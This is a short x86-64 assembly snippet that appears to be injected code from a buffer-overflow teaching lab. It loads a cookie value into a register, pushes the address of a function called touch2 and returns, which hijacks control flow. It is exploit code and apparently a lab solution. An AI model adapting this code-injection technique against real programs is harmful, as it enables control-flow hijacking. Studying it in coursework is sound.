movq $0x59b997fa, %rdi     # cookie to rdi
pushq $0x4017ec               # test return adr(touch2) push to stack
retq                         # pop stack to rip